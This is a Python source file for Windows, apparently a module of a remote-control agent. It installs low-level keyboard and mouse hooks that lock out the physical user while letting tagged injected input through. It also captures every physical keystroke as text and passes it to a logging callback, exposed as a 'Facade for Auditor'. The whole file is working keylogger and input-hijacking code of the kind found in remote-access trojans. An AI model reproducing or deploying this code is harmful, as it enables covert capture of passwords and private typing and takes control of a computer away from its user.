
import ctypes
import threading
from ctypes import wintypes

DEBUG = False
def debug_log(msg):
    if DEBUG:
        print(f"[DEBUG][InputBlocker] {msg}")

# Windows API Constants
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14
WM_KEYDOWN = 0x0100
WM_QUIT = 0x0012

# Hook Codes
HC_ACTION = 0

# Flags for LLHOOKSTRUCT
LLKHF_INJECTED = 0x00000010
LLMHF_INJECTED = 0x00000001

# C Types
LRESULT = ctypes.c_long
HHOOK = ctypes.c_void_p
KBDLLHOOKSTRUCT_P = ctypes.POINTER(ctypes.c_void_p) # Simplified
MSLLHOOKSTRUCT_P = ctypes.POINTER(ctypes.c_void_p)  # Simplified

# Structures
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("pt", wintypes.POINT),
        ("mouseData", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

# Callback Type
HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

class InputBlocker:
    """
    Blocks physical input using Low Level Windows Hooks, 
    but allows Injected (Virtual) input to pass through.
    """
    def __init__(self):
        self._keyboard_hook = None
        self._mouse_hook = None
        self._thread = None
        self._blocking = False
        self._exit_event = threading.Event()
        self.log_callback = None # New: Callback for Key Logging
        
        # Keep references to callbacks to prevent GC
        self._keyboard_proc = HOOKPROC(self._keyboard_callback)
        self._mouse_proc = HOOKPROC(self._mouse_callback)

    def _keyboard_callback(self, nCode, wParam, lParam):
        try:
            if nCode == HC_ACTION:
                # Cast lParam to struct
                kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                
                # Check if Injected (Bit 4 of flags usually, or LLKHF_INJECTED)
                # LLKHF_INJECTED = 0x10
                is_injected = (kb.flags & 0x10) != 0
                
                # Check Magic Signature (dwExtraInfo)
                try:
                    # dwExtraInfo is usually c_void_p, get value
                    extra_info = kb.dwExtraInfo if isinstance(kb.dwExtraInfo, int) else (kb.dwExtraInfo.value if kb.dwExtraInfo else 0)
                    if extra_info == 0xFFC3C3:
                        is_injected = True
                except: pass
                
                # debug_log(f"KeyHook: VK={kb.vkCode}, Flags={kb.flags}, Extra={extra_info}, Injected={is_injected}, Blocking={self._blocking}")
                
                # --- 1. Log Physical Keys (If Callback Set) ---
                if self.log_callback and not is_injected and (wParam == WM_KEYDOWN or wParam == 0x0104): # WM_SYSKEYDOWN
                    try:
                        # Convert to String (Simulate ToUnicode)
                        vk = kb.vkCode
                        scan = kb.scanCode
                        
                        # Keyboard State
                        kbd_state = (ctypes.c_byte * 256)()
                        ctypes.windll.user32.GetKeyboardState(ctypes.byref(kbd_state))
                        
                        # Buffer
                        buff = ctypes.create_unicode_buffer(5)
                        ret = ctypes.windll.user32.ToUnicode(vk, scan, ctypes.byref(kbd_state), buff, 5, 0)
                        
                        key_str = ""
                        if ret > 0:
                            key_str = buff.value
                        
                        # Special Keys fallback
                        if vk == 0x0D: key_str = "\n"
                        elif vk == 0x08: key_str = "[<-]"
                        elif vk == 0x09: key_str = "[Tab]"
                        elif vk == 0x20: key_str = "[space]"
                        elif vk == 0x1B: key_str = "[ESC]"
                        elif vk >= 0x70 and vk <= 0x87: key_str = f"[F{vk-0x6F}]"
                        
                        if key_str:
                            #  print(f"[DEBUG] Keylog: {repr(key_str)}") if DEBUG else None
                             self.log_callback(key_str)
                    except Exception as e:
                        print(f"[-] Log Error: {e}")

                # --- 2. Kill Switch: Ctrl + Alt + Shift + ` (Backtick) ---
                # VK_OEM_3 is typically `~ on US keyboards. 
                if kb.vkCode == 0xC0 and wParam == WM_KEYDOWN:  # 0xC0 = VK_OEM_3
                    user32 = ctypes.windll.user32
                    # Check Modifiers (High bit set = Pressed)
                    ctrl = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0
                    alt = (user32.GetAsyncKeyState(0x12) & 0x8000) != 0
                    shift = (user32.GetAsyncKeyState(0x10) & 0x8000) != 0
                    
                    if ctrl and alt and shift:
                        print("[!] Kill Switch Activated: Unblocking Input")
                        self._blocking = False
                        return 0 # Pass key through
                
                # --- 3. Blocking Logic ---
                # If blocking enabled AND input is PHYSICAL (not injected) -> Block it
                if self._blocking and not is_injected:
                    return 1 # Block
        except Exception as e:
            print(f"[-] Hook Callback Critical Error: {e}")
            
        return ctypes.windll.user32.CallNextHookEx(self._keyboard_hook, nCode, wParam, lParam)

    def _mouse_callback(self, nCode, wParam, lParam):
        if nCode == HC_ACTION:
            ms = ctypes.cast(lParam, ctypes.POINTER(MSLLHOOKSTRUCT)).contents
            
            # Check if Injected
            is_injected = (ms.flags & 0x01) != 0
            
            # Check Magic Signature (dwExtraInfo)
            try:
                 extra_info = ms.dwExtraInfo if isinstance(ms.dwExtraInfo, int) else (ms.dwExtraInfo.value if ms.dwExtraInfo else 0)
                 if extra_info == 0xFFC3C3:
                     is_injected = True
            except: pass
            
            # debug_log(f"MouseHook: Msg={wParam}, Extra={extra_info}, Injected={is_injected}")
            
            if self._blocking and not is_injected:
                return 1 # Block
                
        return ctypes.windll.user32.CallNextHookEx(self._mouse_hook, nCode, wParam, lParam)

    def _message_loop(self):
        """Thread that installs hooks and pumps messages"""
        print("[+] InputBlocker (Consolidated) Thread Started")
        
        # Install Hooks
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        # Define Argument Types to prevent ctypes errors
        # HHOOK SetWindowsHookExW(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId)
        user32.SetWindowsHookExW.argtypes = [ctypes.c_int, HOOKPROC, ctypes.c_void_p, wintypes.DWORD]
        user32.SetWindowsHookExW.restype = ctypes.c_void_p # HHOOK
        
        # LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam)
        user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
        user32.CallNextHookEx.restype = LRESULT

        # BOOL UnhookWindowsHookEx(HHOOK hhk)
        user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
        user32.UnhookWindowsHookEx.restype = wintypes.BOOL
        
        # Define GetModuleHandleW types (CRITICAL for 64-bit)
        kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
        kernel32.GetModuleHandleW.restype = ctypes.c_void_p
        
        # Get Module Handle (NULL for current process)
        h_mod = kernel32.GetModuleHandleW(None)
        
        # Store hooks as c_void_p explicitly
        self._keyboard_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, self._keyboard_proc, h_mod, 0)
        self._mouse_hook = user32.SetWindowsHookExW(WH_MOUSE_LL, self._mouse_proc, h_mod, 0)
        
        if not self._keyboard_hook or not self._mouse_hook:
            print(f"[-] Failed to install hooks. Error: {kernel32.GetLastError()}")
            return
 
        print("[+] Physical Input Hooks Installed")

        # Message Pump
        msg = wintypes.MSG()
        while not self._exit_event.is_set():
            # PeekMessage non-blocking check
            if user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1): # PM_REMOVE = 1
                if msg.message == WM_QUIT:
                    break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            else:
                # Sleep briefly to avoid 100% CPU
                # Reduced sleep for responsiveness
                ctypes.windll.kernel32.Sleep(5) 
                
        # Uninstall Hooks
        if self._keyboard_hook:
            user32.UnhookWindowsHookEx(self._keyboard_hook)
        if self._mouse_hook:
            user32.UnhookWindowsHookEx(self._mouse_hook)
            
        print("[-] InputBlocker Thread Stopped")

    def start(self):
        """Start the blocker hook thread"""
        if self._thread and self._thread.is_alive():
            return
            
        print("[*] Starting InputBlocker Thread...")
        self._exit_event.clear()
        self._blocking = False # Default to non-blocking until requested
        self._thread = threading.Thread(target=self._message_loop, daemon=True)
        self._thread.start()

    def set_blocking(self, block: bool):
        """Enable or disable physical blocking"""
        self._blocking = block
        print(f"[*] Input Blocking set to: {block}")

    def set_logging(self, callback):
        """Set logging callback or None to disable"""
        self.log_callback = callback

    def stop(self):
        """Stop threads and hooks"""
        self._blocking = False
        self._exit_event.set()
        if self._thread:
            self._thread.join(timeout=1)

# Global Instance
_blocker = InputBlocker()

def block_input(block):
    """Facade for Agent to call"""
    if not _blocker._thread or not _blocker._thread.is_alive():
        _blocker.start()
    
    _blocker.set_blocking(block)

def set_key_logger(callback):
    """Facade for Auditor"""
    if not _blocker._thread or not _blocker._thread.is_alive():
        _blocker.start()
    _blocker.set_logging(callback)

